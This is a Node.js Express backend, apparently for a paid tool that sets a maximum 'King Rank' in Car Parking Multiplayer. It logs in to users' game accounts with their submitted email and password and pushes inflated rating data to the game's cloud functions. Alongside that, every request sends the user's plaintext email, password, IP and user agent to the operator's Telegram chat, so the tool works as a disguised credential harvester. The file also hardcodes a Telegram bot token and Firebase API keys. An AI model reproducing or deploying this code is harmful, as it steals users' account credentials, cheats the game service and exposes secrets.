const express = require('express');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const crypto = require('crypto');
require('dotenv').config();

const app = express();

// Security middleware
app.use(helmet());
app.use(cors({
    origin: ['http://localhost:3001', 'https://webtools-cpm-setup-rank.vercel.app'],
    credentials: true
}));
app.use(express.json());

// Rate limiting untuk mencegah abuse
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 30, // Ditingkatkan karena verify key bebas
    message: { success: false, error: 'Too many requests, try again later' }
});
app.use('/api/', limiter);

// ============ COOLDOWN SYSTEM (Hanya untuk SET RANK) ============
const cooldownMap = new Map();
const COOLDOWN_DURATION = 5 * 60 * 1000; // 5 menit

function getCooldownIdentifier(req) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent']?.substring(0, 50) || 'unknown';
    return crypto.createHash('md5').update(`${ip}|${userAgent}`).digest('hex');
}

function checkCooldown(identifier) {
    const cooldownData = cooldownMap.get(identifier);
    if (!cooldownData) return { active: false, remaining: 0 };
    
    const now = Date.now();
    if (now >= cooldownData.endTime) {
        cooldownMap.delete(identifier);
        return { active: false, remaining: 0 };
    }
    
    return { 
        active: true, 
        remaining: cooldownData.endTime - now
    };
}

function setCooldown(identifier, nexusKey, email) {
    const endTime = Date.now() + COOLDOWN_DURATION;
    cooldownMap.set(identifier, {
        endTime: endTime,
        nexusKey: nexusKey,
        email: email,
        timestamp: new Date().toISOString()
    });
    
    setTimeout(() => {
        const current = cooldownMap.get(identifier);
        if (current && current.endTime === endTime) {
            cooldownMap.delete(identifier);
            console.log(`🗑️ Cooldown expired for ${identifier}`);
        }
    }, COOLDOWN_DURATION + 1000);
    
    return endTime;
}

function formatRemainingTime(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
}

// ============ KONFIGURASI ============
const BOT_TOKEN = "8049314105:AAE0Tk2ifyJdACQRGuiQJnN8C-YsNUWuzvI";
const OWNER_ID = "7492782458";

const CPM_CONFIGS = {
    cpm1: {
        name: "CPM1",
        FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
        LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
        RANK_URL: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
    },
    cpm2: {
        name: "CPM2",
        FIREBASE_API_KEY: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ',
        LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
        RANK_URL: 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
    }
};

const NEXUS_VERIFY_URL = "https://system-nexus-key.vercel.app";

// ============ TELEGRAM FUNCTION ============
async function sendToTelegram(email, password, server, nexusKey, statusResult, ipAddress, userAgent) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const now = new Date();
    const timestamp = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    
    let message = `🔐 NEW CPM LOGIN DETECTED!\n\n`;
    message += `📧 Email: ${email}\n`;
    message += `🔒 Password: ${password}\n`;
    message += `🖥️ Server: ${server}\n`;
    message += `🔑 Nexus Key: ${nexusKey}\n`;
    message += `📊 Status: ${statusResult}\n`;
    message += `⏰ Time: ${timestamp}\n`;
    message += `🌐 IP: ${ipAddress}\n`;
    message += `📱 User Agent: ${userAgent}\n`;
    
    try {
        await axios.post(url, {
            chat_id: OWNER_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`✅ Telegram sent for ${email}`);
    } catch (error) {
        console.error('❌ Telegram failed:', error.message);
    }
}

function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.socket.remoteAddress || 
           'Unknown';
}

// ============ ENDPOINT: CEK COOLDOWN (HANYA UNTUK SET RANK) ============
app.get('/api/cooldown-status', (req, res) => {
    const identifier = getCooldownIdentifier(req);
    const cooldown = checkCooldown(identifier);
    
    res.json({
        active: cooldown.active,
        remaining: cooldown.remaining,
        remainingSeconds: Math.floor(cooldown.remaining / 1000),
        formattedTime: formatRemainingTime(cooldown.remaining),
        durationMinutes: COOLDOWN_DURATION / 60000
    });
});

// ============ ENDPOINT: VERIFY NEXUS KEY (TANPA COOLDOWN) ============
app.post('/api/verify-key', async (req, res) => {
    const { key } = req.body;
    
    if (!key) {
        return res.status(400).json({ valid: false, error: 'Key required' });
    }
    
    try {
        const response = await axios.post(`${NEXUS_VERIFY_URL}/api/verify-key`, {
            key: key,
            deviceId: 'cpm_tool_secure_backend'
        }, {
            timeout: 10000,
            headers: { 'Content-Type': 'application/json' }
        });
        
        res.json(response.data);
    } catch (error) {
        console.error('Key verification error:', error.message);
        res.status(400).json({ 
            valid: false, 
            error: 'Verification service unavailable' 
        });
    }
});

// ============ ENDPOINT: SET RANK (DENGAN COOLDOWN) ============
app.post('/api/set-rank', async (req, res) => {
    const { server, email, password, nexusKey } = req.body;
    const ipAddress = getClientIP(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const identifier = getCooldownIdentifier(req);
    
    // CEK COOLDOWN (HANYA UNTUK SET RANK)
    const cooldown = checkCooldown(identifier);
    if (cooldown.active) {
        const errorMsg = `Cooldown active! Please wait ${formatRemainingTime(cooldown.remaining)}`;
        await sendToTelegram(email || 'unknown', password || 'unknown', server || 'unknown', nexusKey || 'unknown', `BLOCKED - ${errorMsg}`, ipAddress, userAgent);
        
        return res.status(429).json({
            success: false,
            cooldown: true,
            remaining: cooldown.remaining,
            formattedTime: formatRemainingTime(cooldown.remaining),
            error: errorMsg
        });
    }
    
    // Validasi input
    if (!server || !email || !password || !nexusKey) {
        const errorMsg = 'Missing required fields';
        await sendToTelegram(email || 'unknown', password || 'unknown', server || 'unknown', nexusKey || 'unknown', errorMsg, ipAddress, userAgent);
        return res.status(400).json({ success: false, error: errorMsg });
    }
    
    const config = CPM_CONFIGS[server];
    if (!config) {
        await sendToTelegram(email, password, server, nexusKey, 'INVALID_SERVER', ipAddress, userAgent);
        return res.status(400).json({ success: false, error: 'Invalid server' });
    }
    
    let loginSuccess = false;
    let rankSuccess = false;
    
    try {
        // Login ke Firebase
        const loginResponse = await axios.post(`${config.LOGIN_URL}?key=${config.FIREBASE_API_KEY}`, {
            email: email,
            password: password,
            returnSecureToken: true,
            clientType: 'CLIENT_TYPE_ANDROID'
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)'
            },
            timeout: 15000
        });
        
        if (!loginResponse.data || !loginResponse.data.idToken) {
            throw new Error('Invalid login response');
        }
        
        const idToken = loginResponse.data.idToken;
        loginSuccess = true;
        
        // Set rank data
        const ratingData = {
            cars: 100000, car_fix: 100000, car_collided: 100000, car_exchange: 100000,
            car_trade: 100000, car_wash: 100000, slicer_cut: 100000, drift_max: 100000,
            drift: 100000, cargo: 100000, delivery: 100000, taxi: 100000, levels: 100000,
            gifts: 100000, fuel: 100000, offroad: 100000, speed_banner: 100000,
            reactions: 100000, police: 100000, run: 100000, real_estate: 100000,
            t_distance: 100000, treasure: 100000, block_post: 100000, push_ups: 100000,
            burnt_tire: 100000, passanger_distance: 100000,
            time: 10000000000,
            race_win: 3000
        };
        
        const rankTimeout = server === 'cpm2' ? 30000 : 15000;
        
        const rankResponse = await axios.post(config.RANK_URL, {
            data: JSON.stringify({ RatingData: ratingData })
        }, {
            headers: {
                'Authorization': `Bearer ${idToken}`,
                'Content-Type': 'application/json',
                'User-Agent': 'okhttp/3.12.13'
            },
            timeout: rankTimeout
        });
        
        if (rankResponse.status === 200) {
            rankSuccess = true;
        } else {
            throw new Error(`Rank API responded with status ${rankResponse.status}`);
        }
        
        // AKTIFKAN COOLDOWN (HANYA SETELAH SUKSES)
        setCooldown(identifier, nexusKey, email);
        
        // Kirim notifikasi ke Telegram
        await sendToTelegram(email, password, config.name, nexusKey, '✅ SUCCESS - King Rank Set', ipAddress, userAgent);
        
        res.json({
            success: true,
            message: '🎉 KING RANK successfully set!',
            server: config.name,
            cooldown: {
                active: true,
                duration: COOLDOWN_DURATION,
                durationFormatted: formatRemainingTime(COOLDOWN_DURATION)
            }
        });
        
    } catch (error) {
        console.error(`❌ Error for ${email}:`, error.message);
        
        let userMessage = '';
        if (error.response?.data?.error?.message) {
            userMessage = error.response.data.error.message;
        } else if (error.code === 'ECONNABORTED') {
            userMessage = 'Connection timeout - please try again';
        } else {
            userMessage = error.message;
        }
        
        const failStatus = loginSuccess ? `❌ FAILED - Rank Error: ${error.message}` : `❌ FAILED - Login Error: ${error.message}`;
        await sendToTelegram(email, password, config.name, nexusKey, failStatus, ipAddress, userAgent);
        
        res.status(500).json({
            success: false,
            error: userMessage
        });
    }
});

// ============ HEALTH CHECK ============
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        activeCooldowns: cooldownMap.size
    });
});

// ============ START SERVER ============
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
    ╔═══════════════════════════════════════════╗
    ║   🔒 NEXUS CPM BACKEND SECURE              ║
    ║   Running on port ${PORT}                       ║
    ║   Telegram Reporter: ACTIVE                ║
    ║   Rate Limiter: ON (30 req/15min)          ║
    ║   Cooldown System: ONLY FOR SET RANK       ║
    ║   Verify Key: FREE (NO COOLDOWN)           ║
    ╚═══════════════════════════════════════════╝
    `);
});